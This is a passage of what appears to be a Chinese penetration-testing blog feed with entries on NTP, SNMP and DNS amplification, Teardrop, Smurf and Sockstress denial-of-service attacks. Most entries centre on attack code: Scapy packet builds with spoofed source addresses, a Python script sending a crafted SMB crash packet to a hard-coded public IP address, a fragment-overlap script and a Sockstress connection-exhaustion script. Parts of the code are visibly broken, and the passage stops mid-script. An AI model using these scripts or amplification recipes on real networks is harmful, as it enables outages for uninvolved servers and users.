        <content type="html"><![CDATA[<blockquote><h3 id="NTP放大攻击"><a href="#NTP放大攻击" class="headerlink" title="NTP放大攻击"></a><strong>NTP放大攻击</strong></h3></blockquote><p><strong>网络时间协议</strong></p><ul><li>Network Time Protocol</li><li>保证网络设备时间同步</li><li>电子设备互相干扰导致时钟差异越来越大</li><li>影响应用正常运行,日志审计不可信</li><li>服务端口 UDP 123</li></ul><h4 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a><strong>攻击原理</strong></h4><ul><li>NTP服务器monlist(MON_GETLIST)查询功能<br>  监控NTP服务器的状况</li><li>客户端查询时,NTP服务器返回最后同步时间的600个客户端IP<br>  每6个IP一个数据包,最多100个数据包(放大约100倍)</li></ul><p><strong>发现NTP服务</strong></p><pre><code>nmap -sU -p123 1.1.1.1 --open        #扫UDP123端口nmap -sU -p123 -sV 1.1.1.1            #扫端口上对应服务</code></pre><p><strong>发现漏洞</strong></p><pre><code>ntpdc -n -c monlist 1.1.1.1ntpq -c rv 1.1.1.1ntpdc -c sysinfo 192.168.20.5</code></pre><p><strong>配置文件</strong></p><pre><code>/etc/ntp.conf    restrict -4 default kod nomodify notrap nopeer noquery    restrict -6 default kod nomodify notrap nopeer noquery</code></pre><h4 id="NTP攻击对策"><a href="#NTP攻击对策" class="headerlink" title="NTP攻击对策"></a><strong>NTP攻击对策</strong></h4><ul><li>升级到ntpd 4.2.7p26以上版本(默认关闭monlist查询)</li><li>手动关闭monlist查询功能</li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 拒绝服务 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 拒绝服务攻击 </tag>
            
            <tag> NTP </tag>
            
            <tag> UDP </tag>
            
            <tag> nmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SNMP放大攻击</title>
      <link href="/2013/10/26/DoS/SNMP%E6%94%BE%E5%A4%A7%E6%94%BB%E5%87%BB/"/>
      <url>/2013/10/26/DoS/SNMP%E6%94%BE%E5%A4%A7%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<blockquote><h3 id="SNMP放大攻击"><a href="#SNMP放大攻击" class="headerlink" title="SNMP放大攻击"></a><strong>SNMP放大攻击</strong></h3></blockquote><h4 id="简单网络管理协议"><a href="#简单网络管理协议" class="headerlink" title="简单网络管理协议"></a><strong>简单网络管理协议</strong></h4><ul><li>Simple Network Management Protocol</li><li>服务端口 UDP 161 / 162　　#161是主动模式开放的端口，162是被动模式开放的端口</li><li>管理设备(manager/客户端),被管理设备(agent/服务端)</li><li>管理信息数据库(MIB)是一个信息存储库,包含管理代理中的有关配置和性能的数据,按照不同分类,包含分属不同组的多个数据对象</li><li>每一个节点都有一个对象标识符(OID)来唯一的标识</li><li>IETF定义标准的MIB库 / 厂家自定义MIB库</li></ul><h4 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a><strong>攻击原理</strong></h4><ul><li>请求流量小,查询结果返回流量大</li><li>结合伪造地址实现攻击</li></ul><h4 id="Windows安装SNMP服务"><a href="#Windows安装SNMP服务" class="headerlink" title="Windows安装SNMP服务"></a><strong>Windows安装SNMP服务</strong></h4><ul><li>定义community        #可以理解为SNMP通信密码</li></ul><h4 id="Scapy-构造攻击数据包原理"><a href="#Scapy-构造攻击数据包原理" class="headerlink" title="Scapy 构造攻击数据包原理"></a><strong>Scapy 构造攻击数据包原理</strong></h4><pre><code>#定义IP头i=IP()i.dst=&quot;1.1.1.1&quot;i.display()#定义UDP头u=UDP()u.dport=161        #定义目标端口u.sport=161        #定义源端口,不定义也可以#定义SNMP头s=SNMP()s.community=&apos;public&apos;s.display()b=SNMPbulk()b.display()b.max_repetitions=100        #定义放大倍数b.varbindlist=[SNMPvarbind(oid=ASN1_OID(&apos;1.3.6.1.2.1.1&apos;)),SNMPvarbind(oid=ASN1_OID(&apos;1.3.6.1.2.1.19.1.3&apos;))]        #定义查询节点s.PDU=bsnmp.display()r=(i/u/s)        #组合包头r.display()sr1(r)            #发包</code></pre><h5 id="nmap批量扫描SNMP服务"><a href="#nmap批量扫描SNMP服务" class="headerlink" title="nmap批量扫描SNMP服务"></a><strong>nmap批量扫描SNMP服务</strong></h5><pre><code>nmap -sU -p161 202.102.0.0/16</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 拒绝服务 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 拒绝服务攻击 </tag>
            
            <tag> scapy </tag>
            
            <tag> UDP </tag>
            
            <tag> nmap </tag>
            
            <tag> SNMP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DNS放大攻击</title>
      <link href="/2013/10/25/DoS/DNS%E6%94%BE%E5%A4%A7%E6%94%BB%E5%87%BB/"/>
      <url>/2013/10/25/DoS/DNS%E6%94%BE%E5%A4%A7%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<blockquote><h3 id="DNS放大攻击"><a href="#DNS放大攻击" class="headerlink" title="DNS放大攻击"></a>DNS放大攻击</h3></blockquote><h4 id="产生大流量的攻击方法"><a href="#产生大流量的攻击方法" class="headerlink" title="产生大流量的攻击方法"></a><strong>产生大流量的攻击方法</strong></h4><ul><li>单机的带宽优势</li><li>巨大单机数量形成的流量汇聚</li><li>利用协议特性实现放大效果的流量</li></ul><h4 id="DNS协议放大效果"><a href="#DNS协议放大效果" class="headerlink" title="DNS协议放大效果"></a><strong>DNS协议放大效果</strong></h4><ul><li>查询请求流量小,但相应流量可能非常巨大<br><code>dig ANY hp.com @202.106.0.20</code>    #流量放大约8倍</li></ul><h4 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a><strong>攻击原理</strong></h4><ul><li>伪造源地址为被攻击目标地址,向递归域名查询服务器发起查询</li><li>DNS服务器成为流量放大和实施攻击者,大量DNS服务器实现DDoS</li></ul><p><strong>Scapy构造攻击数据包</strong></p><ul><li>IP/UDP/DNS/DNS查询内容</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#构造IP数据包</span><br><span class="line">i&#x3D;IP()</span><br><span class="line">i.dst&#x3D;&quot;202.106.0.20&quot;</span><br><span class="line">i.src&#x3D;&quot;1.1.1.1&quot;</span><br><span class="line">i.display()</span><br><span class="line"></span><br><span class="line">u&#x3D;UDP()</span><br><span class="line">u.display()</span><br><span class="line">u.dport#UDP端口</span><br><span class="line"></span><br><span class="line">d&#x3D;DNS()</span><br><span class="line">d.rd&#x3D;1#开启递归查询</span><br><span class="line">d.qdount&#x3D;1#开启递归查询</span><br><span class="line">d.display()</span><br><span class="line"></span><br><span class="line">q&#x3D;DNSQR()#DNS 查询记录</span><br><span class="line">q.qname&#x3D;&#39;hp.com&#39;#定义所要查询的域名</span><br><span class="line">q.qtype&#x3D;255#默认只查A记录,255代表查所有记录,不过现在大部分公网DNS服务器都限制了ANY查询，所以还是改成默认的A</span><br><span class="line">q.display()</span><br><span class="line"></span><br><span class="line">d.qd&#x3D;q#将d的qd字段和q(即DNS查询记录)绑定一起</span><br><span class="line">d.display()</span><br><span class="line"></span><br><span class="line">r&#x3D;(i&#x2F;u&#x2F;d)#r即response,将IP头,UDP头,DNS头绑定在一起</span><br><span class="line">r.display()</span><br><span class="line">rsr1(r)#发包</span><br><span class="line">send(r)</span><br></pre></td></tr></table></figure><ul><li>结合IP地址欺骗,利用大量DNS服务器做傀儡攻击目标</li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 拒绝服务 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DNS </tag>
            
            <tag> dig </tag>
            
            <tag> 拒绝服务攻击 </tag>
            
            <tag> scapy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TearDrop泪D攻击</title>
      <link href="/2013/10/24/DoS/TearDrop%E6%B3%AAD%E6%94%BB%E5%87%BB/"/>
      <url>/2013/10/24/DoS/TearDrop%E6%B3%AAD%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<blockquote><h3 id="TearDrop"><a href="#TearDrop" class="headerlink" title="TearDrop"></a><strong>TearDrop</strong></h3></blockquote><ul><li>主要针对早期微软操作系统(95,98,3.x,nt)<br>  近些年有人发现对2.x版本的android系统,6.0IOS系统攻击有效</li><li>原理很有趣<br>  使用IP分段偏移值实现分段覆盖,接收端处理分段覆盖时可被拒绝服务</li><li>攻击效果<br>  被攻击者蓝屏,重启,卡死</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;-PAYLOAD最大1480字节(全部参与计算offset)-&gt;</span><br><span class="line">MAC头IP头上层头DATAFCS</span><br><span class="line">&lt;-Total Length 最大 1500 字节-&gt;</span><br><span class="line">  &lt;-以太网数据网包,最大 1518 字节-&gt;</span><br></pre></td></tr></table></figure><ul><li><p>Ping大包,比较正常分段与teardrop攻击流量在区别</p><p>  <code>ping -l 4000 192.168.199.158</code></p></li><li><p>针对早期windows系统SMB协议的攻击</p></li></ul><p><strong>Python攻击脚本</strong>    <code>teardrop_smb.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># When SMB2.0 recieve a "&amp;" char in the "Process Id High"</span></span><br><span class="line"><span class="comment"># SMB header field it dies with a</span></span><br><span class="line"><span class="comment"># PAGE_FAULT_IN_NONPAGED_AREA</span></span><br><span class="line"><span class="comment"># filename: teardrop-attack-smb.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"><span class="comment">#host = sys.argv[1], 445</span></span><br><span class="line"><span class="comment">#host = "192.168.33.13", 445</span></span><br><span class="line">host = <span class="string">"217.113.205.53"</span>, <span class="number">445</span></span><br><span class="line">buff = (</span><br><span class="line"><span class="string">"\x00\x00\x00\x90"</span> <span class="comment"># Begin SMB header: Session message</span></span><br><span class="line"><span class="string">"\xff\x53\x4d\x42"</span> <span class="comment"># Server Component: SMB</span></span><br><span class="line"><span class="string">"\x72\x00\x00\x00"</span> <span class="comment"># Negociate Protocol</span></span><br><span class="line"><span class="string">"\x00\x18\x53\xc8"</span> <span class="comment"># Operation 0x18 &amp; sub 0xc853</span></span><br><span class="line"><span class="string">"\x00\x26"</span><span class="comment"># Process ID High: --&gt; :) normal value should be "\x00\x00"</span></span><br><span class="line"><span class="string">"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xfe"</span></span><br><span class="line"><span class="string">"\x00\x00\x00\x00\x00\x6d\x00\x02\x50\x43\x20\x4e\x45\x54"</span></span><br><span class="line"><span class="string">"\x57\x4f\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31"</span></span><br><span class="line"><span class="string">"\x2e\x30\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00"</span></span><br><span class="line"><span class="string">"\x02\x57\x69\x6e\x64\x6f\x77\x73\x20\x66\x6f\x72\x20\x57"</span></span><br><span class="line"><span class="string">"\x6f\x72\x6b\x67\x72\x6f\x75\x70\x73\x20\x33\x2e\x31\x61"</span></span><br><span class="line"><span class="string">"\x00\x02\x4c\x4d\x31\x2e\x32\x58\x30\x30\x32\x00\x02\x4c"</span></span><br><span class="line"><span class="string">"\x41\x4e\x4d\x41\x4e\x32\x2e\x31\x00\x02\x4e\x54\x20\x4c"</span></span><br><span class="line"><span class="string">"\x4d\x20\x30\x2e\x31\x32\x00\x02\x53\x4d\x42\x20\x32\x2e"</span></span><br><span class="line"><span class="string">"\x30\x30\x32\x00"</span></span><br><span class="line">)</span><br><span class="line">s = socket()</span><br><span class="line">s.connect(host)</span><br><span class="line">s.send(buff)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><ul><li>针对 Android,IOS系统的攻击</li></ul><p><strong>Python攻击脚本</strong>    <code>teardrop_android_ios.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/user/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line">total = len(sys.argv)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> total !=<span class="number">3</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Performs teardrop attack from Kali linux"</span></span><br><span class="line">    <span class="keyword">print</span>  <span class="string">" "</span></span><br><span class="line">    <span class="keyword">print</span>  <span class="string">"Usage: ./tear TARCET-IP ATTACK-CODE"</span></span><br><span class="line">    <span class="keyword">print</span>  <span class="string">"    Attacl Codes:"</span></span><br><span class="line">    <span class="keyword">print</span>  <span class="string">"    0: small payload (36 bytes), 2 packets, offset=3x8 bytes"</span></span><br><span class="line">    <span class="keyword">print</span>  <span class="string">"    1: large payload (1300 bytes), 2 packets, offset=80x8 bytes"</span></span><br><span class="line">    <span class="keyword">print</span>  <span class="string">"    2: large payload (1300 bytes), 12 packsts, offset=08x8"</span></span><br><span class="line">    <span class="keyword">print</span>  <span class="string">"    3: large payload (1300 bytes), 2 packets, offset=3x8 bytes"</span></span><br><span class="line">    <span class="keyword">print</span>  <span class="string">"    4: large payload (1300 bytes), 2 packets, offset=10x8 bytes"</span></span><br><span class="line"></span><br><span class="line">target =str(sys.argv[<span class="number">1</span>])</span><br><span class="line">attack=sys.argv[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'Attacking target'</span> + target + <span class="string">'with attack'</span> + accack</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> attack == <span class="string">'0'</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Using attack 0"</span></span><br><span class="line"><span class="string">    size=36</span></span><br><span class="line"><span class="string">    offset=3</span></span><br><span class="line"><span class="string">    load1="\x00"*size</span></span><br><span class="line"><span class="string">    i=IP()</span></span><br><span class="line"><span class="string">    i.dst=target</span></span><br><span class="line"><span class="string">    i.flags="MF"</span></span><br><span class="line"><span class="string">    i.proto=17</span></span><br><span class="line"><span class="string">    size=4</span></span><br><span class="line"><span class="string">    offset=18</span></span><br><span class="line"><span class="string">    load2="\x00"*size</span></span><br><span class="line"><span class="string">    j=IP()</span></span><br><span class="line"><span class="string">    j.dst=target</span></span><br><span class="line"><span class="string">    j.flags=0</span></span><br><span class="line"><span class="string">    j.proto=17</span></span><br><span class="line"><span class="string">    j.frag=offset</span></span><br><span class="line"><span class="string">    send(i/load1)</span></span><br><span class="line"><span class="string">    send(j/load2)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">elif attack == '</span><span class="number">1</span><span class="string">':</span></span><br><span class="line"><span class="string">    print "Using attack 1"</span></span><br><span class="line"><span class="string">    size=1300</span></span><br><span class="line"><span class="string">    offset=80</span></span><br><span class="line"><span class="string">    load="A"*size</span></span><br><span class="line"><span class="string">    i=IP()</span></span><br><span class="line"><span class="string">    i.dst=target</span></span><br><span class="line"><span class="string">    i.flags="MF"</span></span><br><span class="line"><span class="string">    i.proto=17</span></span><br><span class="line"><span class="string">    size=4</span></span><br><span class="line"><span class="string">    offset=18</span></span><br><span class="line"><span class="string">    load2="\x00"*size</span></span><br><span class="line"><span class="string">    j=IP()</span></span><br><span class="line"><span class="string">    j.dst=target</span></span><br><span class="line"><span class="string">    j.flags=0</span></span><br><span class="line"><span class="string">    j.proto=17</span></span><br><span class="line"><span class="string">    j.frag=offset</span></span><br><span class="line"><span class="string">    send(i/load1)</span></span><br><span class="line"><span class="string">    send(j/load2)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">elif attack == '</span><span class="number">2</span><span class="string">':</span></span><br><span class="line"><span class="string">    print "Using attack 2"</span></span><br><span class="line"><span class="string">    print "Attacking wiht attack 2"</span></span><br><span class="line"><span class="string">    size=1300</span></span><br><span class="line"><span class="string">    offset=80</span></span><br><span class="line"><span class="string">    load="A"*size</span></span><br><span class="line"><span class="string">    i=IP()</span></span><br><span class="line"><span class="string">    i.dst=target</span></span><br><span class="line"><span class="string">    i.proto=17</span></span><br><span class="line"><span class="string">    i.flags="MF"</span></span><br><span class="line"><span class="string">    i.frag=0</span></span><br><span class="line"><span class="string">    send(i/load)</span></span><br><span class="line"><span class="string">    print "Attack 2 packet 0"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    for x in range(1, 10)</span></span><br><span class="line"><span class="string">        i.frag=offset</span></span><br><span class="line"><span class="string">        offset=offset+80</span></span><br><span class="line"><span class="string">        send(i/load)</span></span><br><span class="line"><span class="string">        print "Attack 2 packet " + str(x)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    i.frag=offset</span></span><br><span class="line"><span class="string">    i.flags=0</span></span><br><span class="line"><span class="string">    send(i/load)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">elif attack == '</span><span class="number">3</span><span class="string">':</span></span><br><span class="line"><span class="string">    print "Using attack 2"</span></span><br><span class="line"><span class="string">    size=1336</span></span><br><span class="line"><span class="string">    offset=3</span></span><br><span class="line"><span class="string">    load="A"*size</span></span><br><span class="line"><span class="string">    i=IP()</span></span><br><span class="line"><span class="string">    i.dst=target</span></span><br><span class="line"><span class="string">    i.flags="MF"</span></span><br><span class="line"><span class="string">    i.proto=17</span></span><br><span class="line"><span class="string">    size=4</span></span><br><span class="line"><span class="string">    offset=18</span></span><br><span class="line"><span class="string">    load2="\x00"*size</span></span><br><span class="line"><span class="string">    j=IP()</span></span><br><span class="line"><span class="string">    j.dst=target</span></span><br><span class="line"><span class="string">    j.flags=0</span></span><br><span class="line"><span class="string">    j.proto=17</span></span><br><span class="line"><span class="string">    j.frag=offset</span></span><br><span class="line"><span class="string">    send(i/load1)</span></span><br><span class="line"><span class="string">    send(j/load2)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">else:         # attack==4</span></span><br><span class="line"><span class="string">    print "Using attack 4"</span></span><br><span class="line"><span class="string">    size=1300</span></span><br><span class="line"><span class="string">    load="A"*size</span></span><br><span class="line"><span class="string">    i=IP()</span></span><br><span class="line"><span class="string">    i.dst=target</span></span><br><span class="line"><span class="string">    i.flags="MF"</span></span><br><span class="line"><span class="string">    i.proto=17</span></span><br><span class="line"><span class="string">    j=IP()</span></span><br><span class="line"><span class="string">    j.dst=target</span></span><br><span class="line"><span class="string">    j.flags=0</span></span><br><span class="line"><span class="string">    j.proto=17</span></span><br><span class="line"><span class="string">    j.frag=offset</span></span><br><span class="line"><span class="string">    send(i/load1)</span></span><br><span class="line"><span class="string">    send(j/load2)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">prubt "Done!"</span></span><br></pre></td></tr></table></figure><ul><li>攻击向量并不确定,要视具体协议分析</li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 拒绝服务 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 拒绝服务攻击 </tag>
            
            <tag> DoS攻击 </tag>
            
            <tag> teardrop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Smurf攻击及TCP服务Sockstress攻击</title>
      <link href="/2013/10/24/DoS/Smurf%E6%94%BB%E5%87%BB%E5%8F%8ATCP%E6%9C%8D%E5%8A%A1Sockstress%E6%94%BB%E5%87%BB/"/>
      <url>/2013/10/24/DoS/Smurf%E6%94%BB%E5%87%BB%E5%8F%8ATCP%E6%9C%8D%E5%8A%A1Sockstress%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<blockquote><h3 id="Smurf攻击"><a href="#Smurf攻击" class="headerlink" title="Smurf攻击"></a><strong>Smurf攻击</strong></h3></blockquote><p><strong>世界上最古老的DDoS攻击技术</strong></p><ul><li>向广播地址发送伪造源地址的ICMP echo Request(ping)包</li><li>LAN所有计算机向伪造地址返回响应包</li><li>对现代操作系统几乎无效(不响应目标为广播的ping)</li></ul><h4 id="Scapy"><a href="#Scapy" class="headerlink" title="Scapy"></a><strong>Scapy</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">scapy</span><br><span class="line">i&#x3D;IP()</span><br><span class="line">i.dst&#x3D;&quot;1.1.1.255&quot;</span><br><span class="line">p&#x3D;ICMP()</span><br><span class="line">p.display()</span><br><span class="line">r&#x3D;(i&#x2F;p)</span><br><span class="line">send(IP(dst&#x3D;&quot;1.1.1.255&quot;,src&#x3D;&quot;1.1.1.2&quot;)&#x2F;ICMP(),count&#x3D;100,verbose&#x3D;1)</span><br></pre></td></tr></table></figure><blockquote><h3 id="Sockstress"><a href="#Sockstress" class="headerlink" title="Sockstress"></a><strong>Sockstress</strong></h3></blockquote><p>2008年由Jack C.Louis发现</p><p><strong>针对TCP服务的拒绝服务攻击</strong></p><ul><li>消耗被攻击目标系统资源</li><li>与攻击目标建立大量socket连接</li><li>完成三次握手,最后的ACK包window大小为0(客户端不接收数据)</li><li>攻击者资源消耗小(CPU,内存,带宽)</li><li>异步攻击,单机可拒绝服务高配置源服务器</li><li>Window窗口实现的TCP流控</li></ul><h4 id="Python攻击脚本-Sockstress-py"><a href="#Python攻击脚本-Sockstress-py" class="headerlink" title="Python攻击脚本: ./Sockstress.py"></a><strong>Python攻击脚本:</strong> <code>./Sockstress.py</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># .*. coding: utf-8 .*.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> thread</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">logging.getLogger(<span class="string">"scapy.runtime"</span>).setLevel(logging.ERROR)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) !=<span class="number">4</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"用法: ./Sockstress.py [目标IP] [端口] [线程数]"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"举例: ./Sockstress.py 1.1.1.1 21 20  #请确定被攻击的端口处于开放状态"</span></span><br><span class="line">sys.exit()</span><br><span class="line"></span><br><span class="line">target=str(sys.argv[<span class="number">1</span>])</span><br><span class="line">dstport=int(sys.argv[<span class="number">2</span>])</span><br><span class="line">threads=int(sys.argv[<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#攻击函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sockstress</span><span class="params">(target,dstport)</span>:</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">0</span>==<span class="number">0</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">x=random.randint(<span class="number">0</span>,<span class="number">65535</span>)</span><br><span class="line">response=sr1(IP(dst=target)/TCP(sport=x,dport=dstport,flags=<span class="string">'S'</span>),timeout=<span class="number">1</span>,verbose=<span class="number">0</span>)</span><br><span class="line">send(IP(dst=target)/TCP(dport=dstport,sport=x,window=<span class="number">0</span>,flags=<span class="string">'A'</span>,ack=(response[TCP].seq+<span class="number">1</span>))/<span class="string">'\x00\x00'</span>,verbose=<span class="number">0</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#停止攻击函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shutdown</span><span class="params">(signal,frame)</span>:</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'正在恢复 iptables 规则'</span></span><br><span class="line">os.system(<span class="string">'iptables -D OUTPUT -p tcp --tcp-flags RST RST -d '</span>+target+<span class="string">' -j DROP'</span>)</span><br><span class="line">sys.exit()</span><br><span class="line"></span><br><span class="line"><span class="comment">#添加iptables规则</span></span><br><span class="line">os.system(<span class="string">'iptables -A OUTPUT -p tcp --tcp-flags RST 